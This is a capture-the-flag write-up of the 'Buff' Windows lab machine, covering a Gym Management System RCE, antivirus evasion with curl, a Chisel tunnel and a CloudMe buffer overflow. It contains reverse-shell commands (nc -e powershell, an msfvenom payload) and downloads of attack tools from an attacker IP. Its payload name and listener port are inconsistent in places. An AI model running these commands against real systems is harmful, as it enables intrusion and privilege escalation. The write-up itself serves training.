+++
date = '2026-08-11T14:19:15+02:00'
draft = false
title = 'Buff Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`31/12/2025`**

![Buff.png](/images/imgs_buff/Buff.png)

---
# Introduction

**_Buff_** is an **Easy-level Windows** box that focuses on exploiting public vulnerabilities and practicing essential port forwarding and binary exploitation skills.

The initial foothold is straightforward, requiring the exploitation of an **Unauthenticated Remote Code Execution** vulnerability in a well-known **Gym Management CMS**.
The privilege escalation phase involves bypassing basic antivirus restrictions to enumerate internal services, setting up a tunnel with **Chisel**, and ultimately exploiting a local **Buffer Overflow** in the **CloudMe** application to gain a **SYSTEM** shell.

---
# Techniques Used

- **Gym Management System 1.0 RCE (Unauthenticated)**

- **Antivirus Evasion (Living off the Land)**

- **Port Forwarding / Pivoting**

- **Buffer Overflow (CVE-2020-37070)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- buff -Pn 
```

```text
PORT     STATE SERVICE
7680/tcp open  pando-pub
8080/tcp open  http-proxy
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV buff -Pn
```

```text
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-title: mrb3n's Bro Hut
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
```

**Open ports**:

- **7680**/tcp - pando-pub

- **8080**/tcp - http (Apache)

## HTTP - Web Enumeration

Browsing port 8080, I found a "Fitness" website hosted on an **Apache/PHP** backend.

![web.png](/images/imgs_buff/web.png)

![backend.png](/images/imgs_buff/backend.png)

Looking around the main pages, I noticed the title "**mrb3n's Bro Hut**". As a good habit, I preventively saved potential usernames in a **`users.txt`** file: **mrb3n**, **ben**, **b3n**.

While inspecting the **Contact** section, I found a critical piece of information leaked at the bottom of the page: "**Made using `Gym Management Software 1.0`**".

![web1.png](/images/imgs_buff/web1.png)

---
# Initial Access | Gym Management System RCE

I used **searchsploit** to look for known vulnerabilities associated with this specific software version:

```bash
searchsploit Gym Management System 1.0
searchsploit -x php/webapps/48506.py
searchsploit -m php/webapps/48506.py
```

![scsploit.png](/images/imgs_buff/scsploit.png)

**Note**: _The exploit leverages an insecure file upload feature in the **CMS** to **bypass filters** and **execute code** remotely. I ran the **Python 2.7** exploit against the target._

```bash
python2.7 48506.py http://buff:8080/
```

It dropped me into a basic **pseudo-shell**.

![initial_acces.png](/images/imgs_buff/initial_acces.png)

From here, I was able to grab the **user flag**:

```cmd
type \users\shaun\desktop\user.txt
```

![userf.png](/images/imgs_buff/userf.png)

## Shell Upgrade & Internal Enumeration

The initial web shell was quite limited, so I wanted to upgrade to a proper reverse shell using **`nc.exe`**. I tried to download it using **certutil**:

```cmd
certutil -urlcache -split -f http://10.10.15.152:8080/nc64.exe nc.exe
```

![filefail.png](/images/imgs_buff/filefail.png)

**Failed**. The system likely blocked or dropped the connection. I switched to **curl**, which is natively available in newer **Windows** builds:

```cmd
curl http://10.10.15.152:8000/nc64.exe -o nc.exe
```

![nc.png](/images/imgs_buff/nc.png)

**Positive**. The file transferred successfully. I caught the reverse shell on my listener:

```cmd
nc.exe 10.10.15.152 22667 -e powershell
```

![shell_upgrade.png](/images/imgs_buff/shell_upgrade.png)

With a stable **PowerShell** session, I attempted to transfer **winPEAS** to automate internal enumeration:

```cmd
certutil -urlcache -split -f http://10.10.15.152:8000/WinPEASx64.exe peas.exe
```

![av.png](/images/imgs_buff/av.png)

**Blocked by antivirus**.

However, **curl** bypassed this restriction entirely:

```cmd
curl http://10.10.15.152:8000/winPEASx64.exe -o peas.exe
.\peas.exe
```

![peas1.png](/images/imgs_buff/peas1.png)

Analyzing the **winPEAS** output, I noticed a **MySQL** service running on port **3306**. While I could have tried to connect to the database, another suspicious local service caught my attention listening on port **8888**:

```powershell
  TCP        127.0.0.1             8888          0.0.0.0               0               Listening         2748            CloudMe
```

Initially, I had trouble identifying where this executable was located, but re-checking the **winPEAS** output revealed the exact path and permissions:

![perm.png](/images/imgs_buff/perm.png)

---
# Privilege Escalation | CloudMe Buffer Overflow (CVE-2020-37070)

A quick **Google** search for "**cve Cloudme.exe**" pointed straight to a well-known **Buffer Overflow** vulnerability affecting version **`1.11.2`**. Since the **HTB** machine is literally called **Buff**, I knew this was the intended path without any doubt.

**Note**: _**CVE-2020-37070** is a classic **stack-based Buffer Overflow**. The **CloudMe** sync service, listening locally on port **8888**, fails to properly validate the length of incoming data before copying it into a fixed-size memory buffer. By sending an excessively long string (over **1052 bytes**), an attacker can overflow this buffer and overwrite the **Extended Instruction Pointer** (**EIP**). By replacing the **EIP** with the memory address of a **JMP ESP instruction**, the application's execution flow is forcefully redirected straight into the attacker's custom shellcode located on the stack, resulting in **Local Privilege Escalation** and **arbitrary code execution**._

I found a working **PoC** on **Exploit-DB**: https://www.exploit-db.com/exploits/48389.

![buffcve.png](/images/imgs_buff/buffcve.png)

I analyzed the exploit code and noticed the default payload simply popped **`calc.exe`**.

So, I generated my own **unstaged reverse shell payload** using **msfvenom**:

```bash
msfvenom -e x86 -p windows/reverse_shell_tcp LHOST=10.10.15.152 LPORT=22666 -b '\x00\x0A\x0D' -f python
```

**Note**: _I specifically chose an **unstaged payload** (**`windows/shell_reverse_tcp`**) because the buffer space was large enough to hold the entire shellcode, and it allowed me to catch the reverse connection using a simple **netcat** listener instead of having to set up a **Metasploit** **`multi/handler`**._

![payload.png](/images/imgs_buff/payload.png)

I pasted the generated shellcode into the exploit script. By default, **msfvenom** outputs the shellcode into a variable named **`buf`** (unless specified otherwise with the **`-v`** flag). To make the exploit work without renaming everything, I simply appended **`payload = buf`** to the script.

![exploit.png](/images/imgs_buff/exploit.png)

Since the vulnerable **CloudMe** service was only listening locally (**`127.0.0.1:8888`**), I needed to forward the port to my attacker machine. I transferred **`chisel.exe`** using my trusted **curl** method:

```cmd
curl http://10.10.15.152:8000/chisel.exe -o chisel.exe
```

I created the tunnel:

```bash
# Attacker machine
chisel server -p 8000 --reverse

# Victim machine
.\chisel.exe client 10.10.15.152:8000 R:8888:127.0.0.1:8888
```

![chisel.png](/images/imgs_buff/chisel.png)

With the tunnel established, I started my **netcat** listener on port **22666** and executed the python exploit against my local forwarded port:

```bash
nc -lvnp 22667
python3 exp.py
```

![privesc.png](/images/imgs_buff/privesc.png)

The buffer overflow executed, granting me a reverse shell as **Administrator**. I grabbed the **root flag**:

```cmd
type C:\users\administrator\desktop\root.txt
```

![rootf.png](/images/imgs_buff/rootf.png)

---
# Final Thoughts

An **Easy** machine, and maybe one of the best boxes on the platform to practice basic **Buffer Overflow** vulnerabilities in a realistic, restricted environment.

The foothold rewards solid enumeration and the ability to leverage public exploits. The privilege escalation phase forces the use of port forwarding tools like **Chisel** to reach internal services and demonstrating how basic built-in tools (like **curl**) can sometimes easily **bypass strict AV** configurations that block standard **living-off-the-land** binaries like **certutil**.

**Sources**:

- **Gym Management System 1.0 RCE | https://www.exploit-db.com/exploits/48506**

- **CloudMe 1.11.2 - Buffer Overflow (PoC) | https://www.exploit-db.com/exploits/48389**